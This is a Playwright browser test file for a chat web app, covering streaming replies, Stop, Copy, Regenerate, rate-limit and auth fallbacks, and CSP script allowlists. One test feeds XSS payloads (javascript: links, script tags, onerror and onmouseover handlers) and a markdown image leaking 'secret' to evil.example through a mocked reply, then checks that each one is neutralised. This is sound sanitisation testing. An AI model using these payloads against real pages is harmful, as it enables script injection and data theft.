/**
 * The rebuilt chat page, end to end in a real browser. Every model call is
 * intercepted with a crafted response, so nothing here costs inference.
 */
import { expect, test, type Page } from "@playwright/test";

const v2 = (frames: [string, unknown][]) =>
	frames.map(([event, data]) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`).join("");

async function send(page: Page, text: string) {
	const input = page.locator("#user-input");
	await expect(input).toBeEnabled();
	await input.fill(text);
	await page.locator("#send-button").click();
}

test("replays the audit payloads over protocol 2 without executing anything", async ({ page }) => {
	const dialogs: string[] = [];
	page.on("dialog", (d) => {
		dialogs.push(d.message());
		void d.dismiss();
	});
	await page.route("**/api/chat/guest", (route) =>
		route.fulfill({
			headers: { "content-type": "text/event-stream" },
			body: v2([
				["meta", { model: "m", protocol: 2 }],
				["token", { text: '[x](javascript:window.__xss=2) <script>window.__xss=4</script>\n' }],
				["token", { text: '![leak](https://evil.example/?d=secret) <img src=x onerror="window.__xss=1">\n' }],
				["token", { text: '[SUGGEST]<b onmouseover="window.__xss=3">chip</b>[/SUGGEST]' }],
				["done", {}],
			]),
		}),
	);

	await page.goto("/");
	await send(page, "hello");

	const messages = page.locator("#chat-messages");
	await expect(messages.locator(".suggestion-chip")).toHaveText('<b onmouseover="window.__xss=3">chip</b>');
	await page.waitForTimeout(400);

	await expect(messages.locator("img")).toHaveCount(0);
	await expect(messages.locator("script")).toHaveCount(0);
	await expect(messages.locator("[onerror], [onload], [onclick], [onmouseover]")).toHaveCount(0);
	await expect(messages.locator('a[href^="javascript:" i]')).toHaveCount(0);
	// The markdown image became a link, not an <img>.
	await expect(messages.locator('a[href^="https://evil.example"]')).toHaveText("leak");
	expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined();
	expect(dialogs).toEqual([]);
});

test("streams a v2 reply, shows usage, and restores Send", async ({ page }) => {
	let sentBody: Record<string, unknown> = {};
	await page.route("**/api/chat/guest", async (route) => {
		sentBody = JSON.parse(route.request().postData() ?? "{}");
		await route.fulfill({
			headers: { "content-type": "text/event-stream" },
			body: v2([
				["meta", { model: "@cf/meta/llama-3.1-8b-instruct-fp8", tier: "fast", protocol: 2 }],
				["token", { text: "## Answer\n\n1. one\n2. two" }],
				["usage", { promptTokens: 10, completionTokens: 37 }],
				["done", {}],
			]),
		});
	});

	await page.goto("/");
	// The modes moved into the model picker's popover (DESIGN.md 7).
	await page.locator("#model-trigger").click();
	await page.locator('.mode-btn[data-mode="logical"]').click();
	await page.keyboard.press("Escape");
	await send(page, "count");

	const reply = page.locator(".assistant-message").last();
	await expect(reply.locator("h3")).toHaveText("Answer");
	await expect(reply.locator("ol li")).toHaveCount(2);
	await expect(reply.locator(".message-usage")).toHaveText("37 tokens");
	await expect(page.locator("#send-button")).toHaveAttribute("title", "Send");

	expect(sentBody.protocol).toBe(2);
	// The classic page never sent the mode; the rebuild does.
	expect(sentBody.mode).toBe("logical");
});

test("Stop aborts a reply in flight and says so", async ({ page }) => {
	let release: () => void = () => {};
	const held = new Promise<void>((resolve) => (release = resolve));
	await page.route("**/api/chat/guest", async (route) => {
		await held;
		await route.fulfill({ headers: { "content-type": "text/event-stream" }, body: v2([["done", {}]]) }).catch(() => {});
	});

	await page.goto("/");
	await send(page, "write a long essay");

	const button = page.locator("#send-button");
	await expect(button).toHaveAttribute("title", "Stop generating");
	await expect(button).toHaveClass(/is-stop/);
	// Past the double-click guard.
	await page.waitForTimeout(600);
	await button.click();

	await expect(page.locator(".assistant-message .message-note").last()).toHaveText("Stopped.");
	await expect(button).toHaveAttribute("title", "Send");
	expect(await page.evaluate(() => window.chat?.isProcessing())).toBe(false);
	release();
});

test("the chat works while the 3D viewer is still downloading", async ({ page }) => {
	// The viewer is 2.3 MB. Module scripts run in document order, so a
	// non-async viewer tag would hold the whole app back until it arrived.
	let releaseViewer: () => void = () => {};
	const viewerHeld = new Promise<void>((resolve) => (releaseViewer = resolve));
	await page.route("https://unpkg.com/@splinetool/**", async (route) => {
		await viewerHeld;
		await route.continue().catch(() => {});
	});
	await page.route("**/api/chat/guest", (route) =>
		route.fulfill({ headers: { "content-type": "text/event-stream" }, body: v2([["token", { text: "ready" }], ["done", {}]]) }),
	);
	await page.goto("/", { waitUntil: "domcontentloaded" });
	await send(page, "hi");
	await expect(page.locator(".assistant-message .message-body p").last()).toHaveText("ready", { timeout: 5000 });
	releaseViewer();
});

test("a Login click before Clerk has loaded still opens the modal", async ({ page }) => {
	test.skip(!/eleenai\.xyz/.test(process.env.E2E_BASE_URL ?? ""), "Clerk's production instance only serves the production origin");
	// Hold the SDK back so the click lands before it exists.
	await page.route("https://clerk.eleenai.xyz/npm/**", async (route) => {
		await new Promise((resolve) => setTimeout(resolve, 3000));
		await route.continue();
	});
	await page.goto("/", { waitUntil: "domcontentloaded" });
	await page.locator("#login-button").click({ timeout: 2000 });
	await expect(page.locator(".cl-modalContent")).toBeVisible({ timeout: 30_000 });
});

test("the empty state sends a card's prompt, and comes back on a new chat", async ({ page }) => {
	let sent = "";
	await page.route("**/api/chat/guest", async (route) => {
		const body = JSON.parse(route.request().postData() ?? "{}") as { messages: { role: string; content: string }[] };
		sent = body.messages.at(-1)?.content ?? "";
		await route.fulfill({ headers: { "content-type": "text/event-stream" }, body: v2([["token", { text: "sure" }], ["done", {}]]) });
	});
	await page.goto("/");
	await expect(page.locator(".empty-hello")).toHaveText("Hello");
	const cards = page.locator(".prompt-card");
	await expect(cards).toHaveCount(4);

	await cards.first().click();
	await expect(page.locator(".empty-state")).toHaveCount(0);
	await expect(page.locator(".assistant-message .message-body p").last()).toHaveText("sure");
	expect(sent).toContain("public-key cryptography");

	page.on("dialog", (d) => void d.accept());
	await page.evaluate(() => window.chat?.clearChat({ confirm: false }));
	await expect(page.locator(".prompt-card")).toHaveCount(4);
});

test("Copy puts the reply's text on the clipboard and confirms with a check", async ({ page, context }) => {
	await context.grantPermissions(["clipboard-read", "clipboard-write"]);
	await page.route("**/api/chat/guest", (route) =>
		route.fulfill({
			headers: { "content-type": "text/event-stream" },
			body: v2([["token", { text: "**Bold** answer.\n[SUGGEST]More?[/SUGGEST]" }], ["done", {}]]),
		}),
	);
	await page.goto("/");
	await send(page, "hi");
	const copy = page.locator(".assistant-message .copy-button").last();
	await copy.click();
	await expect(copy).toHaveClass(/is-done/);
	await expect(copy.locator("svg")).toHaveAttribute("data-icon", "check");
	// Markers are not copied; the markdown source is.
	expect(await page.evaluate(() => navigator.clipboard.readText())).toBe("**Bold** answer.");
	await expect(copy.locator("svg")).toHaveAttribute("data-icon", "copy", { timeout: 3000 });
});

test("Regenerate replaces the newest reply and is offered only on it", async ({ page }) => {
	let calls = 0;
	await page.route("**/api/chat/guest", async (route) => {
		calls++;
		const body = JSON.parse(route.request().postData() ?? "{}") as { messages: { role: string }[] };
		await route.fulfill({
			headers: { "content-type": "text/event-stream" },
			// The resent history must end on the user's turn, not the old reply.
			body: v2([["token", { text: `reply ${calls}, last turn ${body.messages.at(-1)?.role}` }], ["done", {}]]),
		});
	});
	await page.goto("/");
	await send(page, "first");
	await expect(page.locator(".assistant-message .message-body p").last()).toHaveText("reply 1, last turn user");
	await send(page, "second");
	await expect(page.locator(".assistant-message .message-body p").last()).toHaveText("reply 2, last turn user");
	await expect(page.locator(".regenerate-button")).toHaveCount(1);

	await page.locator(".regenerate-button").click();
	await expect(page.locator(".assistant-message .message-body p").last()).toHaveText("reply 3, last turn user");
	await expect(page.locator(".assistant-message:not(.is-error) .message-body p", { hasText: "reply 2" })).toHaveCount(0);
	await expect(page.locator(".user-message")).toHaveCount(2);
	expect(await page.evaluate(() => window.chat?.history().filter((m) => m.role === "assistant").length)).toBe(3);
});

test("Jump to latest appears when scrolled up during a reply and takes you back", async ({ page }) => {
	const long = Array.from({ length: 80 }, (_, i) => `Line ${i + 1} of a long answer.`).join("\n\n");
	let release: () => void = () => {};
	let calls = 0;
	await page.route("**/api/chat/guest", async (route) => {
		calls++;
		if (calls === 2) await new Promise<void>((resolve) => (release = resolve));
		await route.fulfill({ headers: { "content-type": "text/event-stream" }, body: v2([["token", { text: long }], ["done", {}]]) }).catch(() => {});
	});
	await page.goto("/");
	await send(page, "long please");
	await expect(page.locator(".message-usage, .message-actions").last()).toBeAttached();

	await send(page, "again");
	const scroller = page.locator("#chat-messages");
	await scroller.evaluate((el) => el.scrollTo({ top: 0 }));
	const pill = page.locator(".jump-pill");
	await expect(pill).toBeVisible();

	await pill.click();
	await expect(pill).toBeHidden();
	await expect.poll(() => scroller.evaluate((el) => el.scrollHeight - el.scrollTop - el.clientHeight)).toBeLessThan(40);
	release();
});

test("a rate limit gets a designed notice, not a generic error", async ({ page }) => {
	await page.route("**/api/chat/guest", (route) =>
		route.fulfill({
			status: 429,
			headers: { "content-type": "application/json", "retry-after": "1500" },
			body: JSON.stringify({ error: "Rate limit exceeded" }),
		}),
	);
	await page.goto("/");
	await send(page, "hi");
	const notice = page.locator(".assistant-message.is-limit").last();
	await expect(notice).toContainText("You've hit the hourly limit");
	await expect(notice).toContainText("25 min");
});

test("a network failure shows the error state", async ({ page }) => {
	await page.route("**/api/chat/guest", (route) => route.abort("failed"));
	await page.goto("/");
	await send(page, "hi");
	await expect(page.locator(".message-error").last()).toContainText("Could not reach EleenAI");
});

test("with Clerk unreachable the composer still works and dead auth controls hide", async ({ page }) => {
	await page.route("https://clerk.eleenai.xyz/**", (route) => route.abort("failed"));
	await page.goto("/");
	await expect(page.locator("#user-input")).toBeEnabled();
	await expect(page.locator("#send-button")).toBeEnabled();
	// Clerk is given 5 s to appear before the page settles on guest mode.
	await expect(page.locator("#login-button")).toBeHidden({ timeout: 10_000 });
	await expect(page.locator(".toast.error")).toContainText("Sign-in is unavailable");
});

test("our own resources raise no CSP report", async ({ page }) => {
	const reports: string[] = [];
	page.on("console", (message) => {
		const text = message.text();
		// Enforced violations log as "Refused to …"; Trusted Types stays Report-Only.
		if (/Report Only|Content Security Policy|Refused to/i.test(text) && !/upgrade-insecure-requests|trusted type/i.test(text)) {
			reports.push(text);
		}
	});
	await page.route("**/api/chat/guest", (route) =>
		route.fulfill({
			headers: { "content-type": "text/event-stream" },
			body: v2([["token", { text: "**ok** `code`" }], ["done", {}]]),
		}),
	);
	await page.goto("/");
	await send(page, "hi");
	await expect(page.locator(".assistant-message .message-body strong").last()).toHaveText("ok");
	await page.waitForTimeout(500);
	// Local dev cannot load the scene (R2 CORS) or production Clerk (origin
	// check), so only reports about this origin's own resources count here.
	const origin = new URL(page.url()).origin;
	expect(reports.filter((r) => r.includes(origin) || /inline|eval/i.test(r))).toEqual([]);
});

test("loads no third-party script beyond Clerk and the Spline viewer", async ({ page }) => {
	const scripts = new Set<string>();
	page.on("request", (r) => {
		if (r.resourceType() === "script") scripts.add(r.url());
	});
	await page.goto("/");
	await page.waitForLoadState("networkidle").catch(() => {});
	const origin = new URL(page.url()).origin;

	for (const url of scripts) {
		const parsed = new URL(url);
		// The Spline viewer spawns its WebGL workers from blob: URLs it builds
		// itself; worker-src allows blob:. Anything else must be a known host.
		if (parsed.protocol === "blob:") {
			expect(url.startsWith(`blob:${origin}/`), url).toBe(true);
			continue;
		}
		if (parsed.origin === origin) continue;
		expect(parsed.protocol, url).toBe("https:");
		// Clerk's SDK, its bot-protection bootstrap (Clerk Protect) and that
		// bootstrap's loader on a random subdomain, the pinned Spline viewer,
		// and on production the Web Analytics beacon the zone injects. The
		// CSP's script-src must list exactly these.
		if (parsed.host.endsWith(".client.protect.clerk.com")) continue;
		expect(
			["clerk.eleenai.xyz", "cdn.protect.clerk.com", "unpkg.com", "static.cloudflareinsights.com"],
			url,
		).toContain(parsed.host);
	}
	// No inline script of ours. On production the zone injects one (JavaScript
	// Detections), stamped with this document's nonce: see the next test.
	expect(await page.locator("script:not([src]):not([nonce])").count()).toBe(0);
});

test("on production, the zone's two injected scripts carry this document's nonce, and nothing else is injected", async ({ page }) => {
	test.skip(!/eleenai\.xyz/.test(process.env.E2E_BASE_URL ?? ""), "Cloudflare injects these only on the production zone");
	const response = await page.goto("/");
	// The enforced policy carries the nonce; Report-Only now holds only Trusted Types.
	const header = response?.headers()["content-security-policy"] ?? "";
	const nonce = /'nonce-([^']+)'/.exec(header)?.[1];
	expect(nonce, "the document's policy carries a nonce").toBeTruthy();

	// The HTML as served, before Clerk or the viewer add scripts of their own.
	const html = (await response?.text()) ?? "";
	const tags = [...html.matchAll(/<script\b([^>]*)>/g)].map((m) => m[1] ?? "");
	const attr = (tag: string, name: string) => new RegExp(`\\b${name}="([^"]*)"`).exec(tag)?.[1] ?? null;
	// Clerk, the app bundle, and /prefs.js (theme and language before first paint, M4.5).
	const ours = (src: string | null) => src !== null && /^(https:\/\/clerk\.eleenai\.xyz\/|\/assets\/|\/prefs\.js$)/.test(src);
	const injected = tags.filter((tag) => !ours(attr(tag, "src")));
	// JavaScript Detections (inline) and the Web Analytics beacon. Nothing more.
	expect(injected.map((tag) => (attr(tag, "src") ? new URL(attr(tag, "src") as string).host : "inline")).sort()).toEqual([
		"inline",
		"static.cloudflareinsights.com",
	]);
	for (const tag of injected) expect(attr(tag, "nonce"), tag.slice(0, 80)).toBe(nonce);
	expect(tags.length - injected.length, "our own three scripts").toBe(3);
});
